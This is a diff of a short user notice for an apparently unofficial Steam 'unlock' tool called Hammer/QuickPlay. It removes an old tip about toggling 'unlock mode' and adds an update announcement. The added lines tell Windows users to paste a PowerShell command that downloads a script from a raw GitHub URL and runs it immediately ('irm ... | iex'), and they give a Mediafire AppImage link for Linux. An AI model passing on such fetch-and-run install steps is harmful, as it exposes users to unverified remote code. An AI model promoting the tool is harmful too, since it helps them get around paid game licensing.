@@ -1,15 +1,14 @@
-telegram >>>> @McdaleHammer
-Discord add me up in Discord so you can still contact me username is >>> hammersteamsupport
+Quickplay Users Only! 🛠️
+Missing games or search not working on Server 2? Update your client now to version 2.7.2 to get the latest version with the fix:
+Windows: Re-paste your original install command in PowerShell: 💻
+PowerShell
+irm https://raw.githubusercontent.com/hammerwebsite12/hammerfree/quickplay/install.ps1 | iex
 
-📢 Quick Troubleshooting Tip! For Hammer app user (Windows) 📢
-
-If your unlock isn't working after the steam update today 7/28/26, 
-
-Just turn OFF UNLOCK MODE 3 swith to OFF and ON , restart Steam
-
-That's it! It should hook perfectly now and get you straight back into the game. 🚀⚡
+SteamOS / Bazzite / Linux: Get the latest update AppImage link directly: 🚀
+https://www.mediafire.com/file/4ldl8iucoqe0xw5/QuickPlay-x86_64+2.6.7.AppImage/file
 
 
+Download QuickPlay AppImage (or check official TG/Discord/Messenger channels)
 My FB account (McDale) is again not active and ban from FB, contact me directly in HammerSteam page
 you may not be able to contact me or send mesage on that account
 
